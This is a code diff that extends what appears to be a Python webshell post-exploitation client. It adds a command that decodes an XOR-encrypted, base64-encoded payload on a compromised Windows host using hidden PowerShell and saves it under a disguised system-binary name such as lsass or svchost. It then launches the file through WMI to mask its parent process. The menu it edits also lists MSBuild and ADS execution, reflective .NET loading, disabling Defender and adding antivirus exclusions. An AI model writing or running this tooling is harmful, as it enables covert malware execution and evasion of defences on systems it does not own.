@@ -1102,6 +1102,72 @@ return true;}}}}
         if r=='skip':print(f"{Y}Not a .NET assembly{W}")
         elif r!='success':print(f"{R}Reflective load failed{W}")
 
+    def post_rundecode(self,name,out_name=None,args=''):
+        """Correct PS decode: ReadAllText -> FromBase64String -> XOR -> WriteAllBytes + WMI launch."""
+        if name not in self.upload_meta:
+            print(f"{R}[!] No upload metadata for '{name}'{W}");return
+        tmp_path,xor_key=self.upload_meta[name]
+        chk=self.execute(f'if exist "{tmp_path}" (echo TMP_OK) else (echo TMP_GONE)')
+        if not chk or 'TMP_GONE' in chk:
+            print(f"{R}[!] .tmp gone: {tmp_path}{W}");return
+        import random,time as _t
+        rnd=random.randint(1000,9999)
+        bs=chr(92)  # backslash
+        cwd=self.current_dir.replace(bs,'/') if self.current_dir else 'C:/Temp'
+        # Choose output name — legitimate-sounding system binary names
+        if not out_name:
+            legit=['svchost','winlogon','services','lsass','csrss']
+            out_name=legit[rnd%len(legit)]+'.exe'
+        out_path=f"{cwd}/{out_name}"
+        # CORRECT decode pipeline for our upload format:
+        # .tmp = base64 text of XOR'd binary
+        # ReadAllText -> Trim CR/LF -> FromBase64String -> XOR decrypt -> WriteAllBytes
+        ps_decode=(
+            f"$key=0x{xor_key:02X};"
+            f"$d=[System.IO.File]::ReadAllText('{tmp_path}');"
+            f"$d=$d.Replace([char]13,'').Replace([char]10,'');"
+            f"$b=[Convert]::FromBase64String($d);"
+            f"for($i=0;$i-lt$b.Count;$i++){{$b[$i]=$b[$i]-bxor$key}};"
+            f"[System.IO.File]::WriteAllBytes('{out_path}',$b)"
+        )
+        print(f"{Y}[*] Decoding {name} -> {out_name} (correct pipeline){W}")
+        print(f"  {DIM}ReadAllText -> FromBase64String -> XOR(0x{xor_key:02X}) -> WriteAllBytes{W}")
+        # Background exec to avoid 90s webshell timeout on large files
+        self.execute(f'start /b powershell -w hidden -Command "{ps_decode}"')
+        # Poll for output file with correct size
+        print(f"  Waiting for decode",end='',flush=True)
+        decoded_ok=False
+        for _ in range(24):
+            _t.sleep(5)
+            print('.',end='',flush=True)
+            sz_cmd=f"powershell -c \"if(Test-Path '{out_path}'){{(Get-Item '{out_path}').Length}}else{{0}}\""
+            sz=self.execute(sz_cmd)
+            if sz and sz.strip().isdigit() and int(sz.strip()) > 100000:
+                fsize=int(sz.strip())
+                print(f"\n{G}[+] Decoded: {out_path} ({fsize}B){W}")
+                decoded_ok=True
+                break
+        if not decoded_ok:
+            print(f"\n{Y}[!] Timeout — check: dir {cwd}{W}")
+            print(f"  {C}Manual:{W} powershell -w hidden -Command \"{ps_decode}\"")
+            return
+        # Execute via WMI (parent=WmiPrvSE.exe, trusted)
+        out_bs=out_path.replace('/',bs*2)
+        print(f"{Y}[*] WMI launch...{W}")
+        wmi_out=self.execute(f'wmic process call create "{out_bs} {args}"')
+        if wmi_out:print(f"  {C}WMI:{W} {wmi_out.strip()[:200]}")
+        _t.sleep(2)
+        pname=out_name.split('.')[0]
+        tl=self.execute(f'tasklist 2>nul | findstr /I "{pname}"')
+        if tl and tl.strip() and '[-]' not in tl:
+            tlines=[l for l in tl.strip().splitlines() if l.strip()]
+            print(f"{G}[+] Process running:{W}")
+            for l in tlines[:5]:print(f"    {l}")
+        else:
+            print(f"{Y}[!] No process found — try manually:{W}")
+            print(f"  wmic process call create \"{out_bs} {args}\"")
+        print(f"  {DIM}Cleanup: del \"{out_path}\"{W}")
+
     def post_runraw(self,tmp_path,xor_key_hex,args=''):
         """Run from a .tmp with manually specified XOR key."""
         try:xor_key=int(xor_key_hex,16)
@@ -1152,8 +1218,9 @@ return true;}}}}
 {BOLD}Execution:{W}
   {G}.exec{W} path [args] Smart exe launcher     {G}.bg{W} cmd           Background run
   {G}.run{W} name [args]  Smart evasive run      {G}.kill{W} pid|name    Kill process
-  {G}.runwmi{W} name      WMI process chain      {G}.runmsbuild{W} name  MSBuild LOLBIN
-  {G}.runads{W} name      ADS stream exec        {G}.runmem{W} name      Reflective .NET
+  {G}.rundecode{W} name   PS decode+WMI launch   {G}.runwmi{W} name      WMI process chain
+  {G}.runmsbuild{W} name  MSBuild LOLBIN         {G}.runads{W} name      ADS stream exec
+  {G}.runmem{W} name      Reflective .NET        {G}.runraw{W} t k       Manual XOR run
   {G}.av{W}               AV/Defender status     {G}.avoff{W}            Disable Defender RT
   {G}.exclude{W} path     Add AV exclusion       {G}.exit{W}             Exit
 """)
@@ -1339,6 +1406,15 @@ return true;}}}}
                             parts=p[1].split(None,1)
                             self.post_runmem(parts[0],parts[1] if len(parts)>1 else '')
                         else:print('Usage: .runmem <name> [args]')
+                    elif cmd.startswith('.rundecode '):
+                        p=cmd.split(None,1)
+                        if len(p)>1:
+                            parts=p[1].split(None,2)
+                            nm=parts[0]
+                            out_nm=parts[1] if len(parts)>1 and parts[1].endswith('.exe') else None
+                            ar=parts[-1] if len(parts)>2 else (parts[1] if len(parts)>1 and not parts[1].endswith('.exe') else '')
+                            self.post_rundecode(nm,out_nm,ar)
+                        else:print('Usage: .rundecode <name> [outfile.exe] [args]')
                     elif cmd.startswith('.run '):
                         p=cmd.split(None,1)
                         if len(p)>1:
